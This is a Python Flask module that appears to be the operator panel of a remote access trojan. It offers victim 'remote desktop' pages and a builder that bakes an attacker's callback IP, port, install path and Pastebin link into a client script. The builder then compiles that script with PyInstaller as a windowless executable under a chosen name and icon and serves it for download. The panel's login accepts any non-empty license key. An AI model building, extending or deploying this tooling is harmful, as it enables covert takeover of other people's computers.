from flask import Blueprint, render_template, request, jsonify, session, redirect, url_for
import os
import json
import subprocess
import shutil
import platform

auth_bp = Blueprint('auth', __name__)

@auth_bp.route('/')
def index():
    if 'logged_in' not in session:
        return redirect(url_for('auth.login'))
    
    headers = request.headers
    return render_template('index.html', headers=headers)

@auth_bp.route('/login')
def login():
    if 'logged_in' in session:
        return redirect(url_for('auth.index'))
    return render_template('login.html')

@auth_bp.route('/login', methods=['POST'])
def login_post():
    data = request.get_json()
    license_key = data.get('licenseKey')
    
    if license_key:
        session['logged_in'] = True
        return jsonify({'status': 'success', 'message': 'Login successful'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid license key'})

@auth_bp.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('auth.login'))
    

@auth_bp.route('/settings', methods=['GET', 'POST'])
def settings():
    
    settings_file = os.path.join(os.path.expanduser('~'), '.cfc', 'settings.json')
    
    os.makedirs(os.path.dirname(settings_file), exist_ok=True)
    
    if request.method == 'POST':
        data = request.get_json()
        port = data.get('port', 5000)
        license_key = data.get('license_key', '')
        api_key = data.get('api_key', '')
        
        settings_data = {
            'port': port,
            'license_key': license_key,
            'api_key': api_key
        }
        
        with open(settings_file, 'w') as f:
            json.dump(settings_data, f)
            
        return jsonify({'status': 'success', 'message': 'Settings saved successfully'})
    else:
        with open(settings_file, 'r') as f:
            settings_data = json.load(f)
            
        return jsonify({'status': 'success', 'data': settings_data})

@auth_bp.route('/remote-desktop/<pc_id>')
def remote_desktop(pc_id):
    if 'logged_in' not in session:
        return redirect(url_for('auth.login'))
    
    return render_template('remote-desktop.html', pc_id=pc_id)


@auth_bp.route('/builder', methods=['GET', 'POST'])
def builder_settings():
    if 'logged_in' not in session:
        return redirect(url_for('auth.login'))

    builder_file = os.path.join(os.path.expanduser('~'), '.cfc', 'builder.json')
    os.makedirs(os.path.dirname(builder_file), exist_ok=True)

    if request.method == 'POST':
        try:
            data = request.get_json(force=True)
        except:
            pass
        
        if not data:
            return jsonify({'status': 'error', 'message': 'Failed to save'})

        payload = {
            'ip': data.get('ip'),
            'port': int(data.get('port')),
            'tag': data.get('tag'),
            'logo_path': data.get('logo_path'),
            'install_location': data.get('install_location'),
            'folder': data.get('folder'),
            'name': data.get('name'),
            'use_pastebin': bool(data.get('use_pastebin')),
            'pastebinlink': data.get('pastebinlink') or ''
        }

        with open(builder_file, 'w') as f:
            json.dump(payload, f)

        try:
            client_dir = os.path.join('client')
            client_config_path = os.path.join(client_dir, 'config.py')
            payload_path = os.path.join(client_dir, 'connect.pyw')

            settings_file = os.path.join(os.path.expanduser('~'), '.cfc', 'settings.json')
            with open(settings_file, 'r') as sf:
                api_key_value = (json.load(sf) or {}).get('api_key', '')
                
            use_pastebin_bool = bool(payload.get('use_pastebin'))
            cfg_content = (
                f'IP = "{payload.get("ip")}"\n'
                f'PORT = "{payload.get("port")}"\n'
                f'TAG_NAME = "{payload.get("tag")}"\n'
                f'API_KEY = "{api_key_value}"\n'
                f'INSTALL_LOCATION = r"{payload.get("install_location")}"\n'
                f'USE_PASTEBIN = {str(use_pastebin_bool)}\n'
                f'PASTEBIN_LINK = "{payload.get("pastebinlink")}"\n'
            )

            with open(client_config_path, 'w', encoding='utf-8') as cf:
                cf.write(cfg_content)

            name = (payload.get('name')).strip()
            icon = (payload.get('logo_path') or '').strip()
            system_name = platform.system().lower()
            
            # Build PyInstaller command (hidden on all platforms)
            cmd = ['pyinstaller', '--onefile', '--noconsole', '--name', name]
            
            # Icon support - PNG works on all platforms
            if icon and icon.lower().endswith('.png'):
                cmd.extend(['--icon', icon])
            cmd.append(payload_path)

            subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            is_windows = platform.system().lower().startswith('win')
            built_filename = f"{name}{'.exe' if is_windows else ''}"
            # Copy/move build to template/downloads for serving
            src_path = os.path.join('dist', built_filename)
            downloads_dir = os.path.join('template', 'downloads')
            os.makedirs(downloads_dir, exist_ok=True)
            dst_path = os.path.join(downloads_dir, built_filename)
            try:
                if os.path.exists(src_path):
                    # Move file to downloads directory (atomic replace if exists)
                    try:
                        os.replace(src_path, dst_path)
                    except Exception:
                        shutil.move(src_path, dst_path)
                else:
                    # Some PyInstaller platforms place binaries at dist/name without extension
                    alt_src_path = os.path.join('dist', name)
                    if os.path.exists(alt_src_path):
                        try:
                            os.replace(alt_src_path, os.path.join(downloads_dir, name))
                        except Exception:
                            shutil.move(alt_src_path, os.path.join(downloads_dir, name))
                        built_filename = name
            except Exception:
                pass
            download_path = f"/downloads/{built_filename}"
        except Exception as e:
            print(e)
            return jsonify({'status': 'error', 'message': 'Failed to build'})

        return jsonify({'status': 'success', 'message': 'Build success', 'data': payload, 'download_path': download_path})

    if os.path.exists(builder_file):
        try:
            with open(builder_file, 'r') as f:
                data = json.load(f)
                return jsonify({'status': 'success', 'data': data})
        except:
            pass

    return jsonify({'status': 'error'})